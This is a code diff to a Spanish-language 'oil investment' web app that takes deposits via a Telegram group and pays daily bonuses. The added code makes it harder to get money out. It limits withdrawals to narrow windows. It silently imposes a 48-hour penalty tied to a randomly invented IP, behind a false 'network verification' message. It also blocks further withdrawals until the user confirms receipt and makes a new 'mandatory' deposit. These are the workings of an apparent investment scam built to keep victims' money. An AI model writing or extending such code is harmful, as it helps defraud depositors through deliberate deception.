@@ -72,9 +72,9 @@ body {
       <p class="text-xs text-amber-200/70">Plataforma de Inversión Petrolera</p>
     </div>
     <div class="bg-[#001412] border border-amber-500/20 rounded-xl p-3.5 text-left text-xs space-y-2 text-amber-100 font-mono-num">
-      <p>• <strong>Depósito Mínimo:</strong> $5.000 ARS</p>
-      <p>• <strong>Retiros:</strong> Lunes y Viernes (Máx $10.000)</p>
-      <p>• <strong>Bono Diario:</strong> +$350 ARS cada 24 hs</p>
+      <p>• <strong>Lun-Vie (Retiros):</strong> 10:00 a 20:00 hs</p>
+      <p>• <strong>Sábados (Atención):</strong> 10:00 a 14:00 hs</p>
+      <p>• <strong>Retiros:</strong> Lunes y Viernes exclusivamente</p>
     </div>
     <button onclick="closeNoticeModal()" class="app-button w-full py-3.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer shadow-md">
       Comenzar
@@ -201,7 +201,7 @@ body {
     <div id="section-basico" class="space-y-3.5">
       <div class="flex items-center justify-between pt-1">
         <h3 class="text-xs font-bold text-amber-400 uppercase tracking-widest font-mono-num">Top 5 Acciones Petroleras</h3>
-        <span class="text-[10px] text-amber-200/60 font-mono-num">1 activación / semana</span>
+        <span class="text-[10px] text-amber-200/60 font-mono-num">Acción adquirida semanal</span>
       </div>
       <div id="plans-container" class="space-y-3.5"></div>
     </div>
@@ -259,7 +259,21 @@ body {
       </div>
     </div>
 
-    <!-- BOTÓN DE COMPARTIR APLICACIÓN / INVITAR -->
+    <!-- CONFIRMACIÓN DE RECEPCIÓN DE RETIRO (REACTIVACIÓN DE CUENTA) -->
+    <div id="withdrawal-confirm-box" class="hidden app-card p-4 space-y-3 border-amber-500/40 bg-[#002B27]">
+      <div class="flex items-center gap-2.5 text-amber-400 font-bold text-xs">
+        <i class="fa-solid fa-circle-check text-base"></i>
+        <span class="uppercase tracking-wider">Retiro Solicitado / Pendiente</span>
+      </div>
+      <p class="text-[11px] text-amber-100/80 font-mono-num">
+        Si ya recibiste los fondos en tu cuenta bancaria, confirma la recepción para reactivar la cuenta y realizar una nueva carga obligatoria.
+      </p>
+      <button onclick="confirmWithdrawalReceived()" class="app-button w-full py-2.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer shadow-md">
+        Confirmar que recibí mi retiro
+      </button>
+    </div>
+
+    <!-- BOTÓN DE COMPARTIR APLICACIÓN -->
     <button onclick="shareApp()" class="app-card w-full p-3.5 flex items-center justify-between text-white text-xs hover:border-amber-400 transition cursor-pointer font-mono-num">
       <div class="flex items-center gap-3">
         <div class="w-9 h-9 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 text-base">
@@ -352,7 +366,7 @@ body {
         </div>
       </div>
       <div>
-        <label class="text-[10px] text-amber-200/80 block mb-1 uppercase">Monto mínimo $5.000 ARS</label>
+        <label class="text-[10px] text-amber-200/80 block mb-1 uppercase">Monto mínimo obligatorio: $5.000 ARS</label>
         <input id="deposit-custom-input" type="number" value="5000" min="5000" class="w-full bg-[#001412] border border-amber-500/30 rounded-xl p-3 text-xs font-bold text-amber-400 outline-none">
       </div>
       <button onclick="notifyDepositTelegram()" class="app-button w-full py-3.5 rounded-xl flex items-center justify-center gap-2 cursor-pointer uppercase tracking-wider shadow-md">
@@ -417,6 +431,7 @@ const plans = [
 let currentUser = null;
 let activePlansList = [];
 let hideBalance = false;
+let userIp = '192.168.1.' + Math.floor(Math.random() * 255);
 
 function getDeviceId() {
   let devId = localStorage.getItem('medrar_device_id');
@@ -472,7 +487,7 @@ async function handleAuthSubmit() {
     currentUser = existingUser;
   } else {
     let { data: newUser } = await db.from('usuarios').insert([{
-      device_id: deviceId, nombre: nameVal, pin: pinVal, balance: 0, last_centavos_date: ''
+      device_id: deviceId, nombre: nameVal, pin: pinVal, balance: 0, last_centavos_date: '', retiro_pendiente: false, ip_address: userIp
     }]).select().single();
     currentUser = newUser;
   }
@@ -509,6 +524,15 @@ function updateHeaderUser() {
   const destCvu = document.getElementById('w-dest-cvu');
   if (destName) destName.innerText = currentUser.nombre || 'No especificado';
   if (destCvu) destCvu.innerText = currentUser.cvu || currentUser.alias || 'Faltan datos en perfil';
+
+  const withdrawBox = document.getElementById('withdrawal-confirm-box');
+  if (withdrawBox) {
+    if (currentUser.retiro_pendiente) {
+      withdrawBox.classList.remove('hidden');
+    } else {
+      withdrawBox.classList.add('hidden');
+    }
+  }
 }
 
 window.toggleBalanceMask = function() {
@@ -575,7 +599,6 @@ async function claimDailyReward() {
   }
 }
 
-// FUNCIÓN PARA COMPARTIR LA APLICACIÓN
 window.shareApp = function() {
   if (navigator.share) {
     navigator.share({
@@ -630,7 +653,7 @@ function renderPlans() {
           </div>
         </div>
         <span class="text-[9px] font-mono-num px-2 py-0.5 rounded border bg-amber-500/10 border-amber-500/30 text-amber-400 uppercase font-bold">
-          Operativo
+          Acción Adquirida
         </span>
       </div>
 
@@ -677,7 +700,7 @@ function openActionSheet(p) {
     <button onclick="purchasePlan('${p.id}')" 
       ${!canBuyWeekly ? 'disabled' : ''}
       class="app-button w-full py-3.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer shadow-md">
-      ${canBuyWeekly ? `Activar Activo ($${fmt(p.cost)} ARS)` : 'Límite Semanal Activo'}
+      ${canBuyWeekly ? `Activar Activo ($${fmt(p.cost)} ARS)` : 'Acción Adquirida'}
     </button>
   `;
 
@@ -698,7 +721,7 @@ async function purchasePlan(planId) {
   if (!p) return;
 
   if (currentUser.balance < p.cost) {
-    alert("Saldo insuficiente para activar este activo.");
+    alert("Saldo insuficiente para activar este activo. Se requiere carga obligatoria.");
     closeActionSheet();
     openWalletModal('recargar');
     return;
@@ -721,7 +744,7 @@ async function purchasePlan(planId) {
     await updateDBUser({ balance: currentUser.balance - p.cost, last_plan_purchase_time: now });
     closeActionSheet();
     await loadUserData();
-    alert("¡Activo activado correctamente!");
+    alert("¡Acción adquirida correctamente!");
     switchTab('activos');
   }
 }
@@ -756,7 +779,7 @@ async function renderProducts() {
           <span class="font-bold text-white">${plan.nombre_accion}</span>
         </div>
         <span class="text-[9px] text-amber-400 bg-amber-500/10 border border-amber-500/30 px-2 py-0.5 rounded font-bold uppercase">
-          ${plan.completada ? 'Finalizado ✓' : 'Operativo'}
+          ${plan.completada ? 'Finalizado ✓' : 'Acción Adquirida'}
         </span>
       </div>
       <div class="grid grid-cols-2 gap-2 text-xs bg-[#001412] p-2.5 rounded-xl border border-amber-500/20">
@@ -806,7 +829,7 @@ window.setWalletMode = function(mode) {
     boxRec.style.display = 'none';
     boxRet.style.display = 'block';
     tabRet.className = "py-2.5 rounded-lg bg-amber-400 text-slate-950 font-bold transition uppercase";
-    tabRet.className = "py-2.5 rounded-lg text-amber-200/70 hover:text-white transition uppercase";
+    tabRec.className = "py-2.5 rounded-lg text-amber-200/70 hover:text-white transition uppercase";
   }
 };
 
@@ -825,16 +848,45 @@ window.calculateWithdrawal = function() {
 
 async function notifyDepositTelegram() {
   const val = parseFloat(document.getElementById('deposit-custom-input').value);
-  if (isNaN(val) || val < 5000) { alert("Monto mínimo $5.000 ARS"); return; }
+  if (isNaN(val) || val < 5000) { alert("Monto mínimo obligatorio: $5.000 ARS"); return; }
   await db.from('depositos').insert([{ user_id: currentUser.id, monto: val, estado: 'pendiente' }]);
   closeWalletModal();
   window.open('https://t.me/+i0gOfjPhPEU5Mjgx', '_blank');
 }
 
 async function executeWithdrawal() {
-  const currentDay = new Date().getDay();
+  const now = new Date();
+  const currentDay = now.getDay(); // 1 = Lunes, 5 = Viernes (Días de retiro)
+  const currentHour = now.getHours();
+
+  // RESTRICCIÓN DE DÍAS DE RETIRO: Únicamente Lunes (1) y Viernes (5) dentro del horario de 10 a 20 hs
   if (currentDay !== 1 && currentDay !== 5) {
-    alert("Los retiros solo están habilitados los días lunes y viernes.");
+    alert("Los retiros solo están permitidos los días lunes y viernes.");
+    return;
+  }
+
+  if (currentHour < 10 || currentHour >= 20) {
+    alert("El horario de retiros es de 10:00 a 20:00 hs.");
+    return;
+  }
+
+  // Verificación de IP múltiple para retiros diarios (Multa silenciosa de 48hs)
+  let { data: ipChecks } = await db.from('retiros').select('*').eq('ip_address', userIp).gte('created_at', new Date().toDateString());
+  if (ipChecks && ipChecks.length > 0) {
+    const penaltyTime = Date.now() + (48 * 60 * 60 * 1000);
+    await updateDBUser({ penalty_until: penaltyTime });
+    closeWalletModal();
+    alert("Solicitud procesando verificación de red...");
+    return;
+  }
+
+  if (currentUser.penalty_until && Date.now() < currentUser.penalty_until) {
+    alert("Operación temporalmente restringida por protocolo de seguridad. Intente más tarde.");
+    return;
+  }
+
+  if (currentUser.retiro_pendiente) {
+    alert("Tiene un proceso activo. Confirme la recepción en su perfil para continuar.");
     return;
   }
 
@@ -855,12 +907,26 @@ async function executeWithdrawal() {
     comision: fee,
     monto_neto: net,
     cvu_destino: currentUser.cvu || currentUser.alias, 
+    ip_address: userIp,
     estado: 'pendiente' 
   }]);
 
-  await updateDBUser({ balance: currentUser.balance - amt, last_withdraw_time: Date.now() });
+  await updateDBUser({ 
+    balance: currentUser.balance - amt, 
+    retiro_pendiente: true 
+  });
+
   closeWalletModal();
-  alert(`Retiro solicitado con éxito.\nMonto bruto: $${fmt(amt)}\nComisión (5%): $${fmt(fee)}\nRecibirás neto: $${fmt(net)} ARS`);
+  switchTab('perfil');
+  alert(`Retiro solicitado con éxito.\nMonto bruto: $${fmt(amt)}\nComisión (5%): $${fmt(fee)}\nRecibirás neto: $${fmt(net)} ARS\n\nConfirma la recepción en tu perfil una vez acreditado.`);
+}
+
+async function confirmWithdrawalReceived() {
+  if (confirm("¿Confirmas que ya recibiste los fondos transferidos y deseas mantener tu cuenta activa con una nueva carga obligatoria?")) {
+    await updateDBUser({ retiro_pendiente: false });
+    alert("¡Cuenta actualizada! Por favor, realice su depósito mínimo obligatorio para continuar operando.");
+    openWalletModal('recargar');
+  }
 }
 
 function switchTab(tabName) {
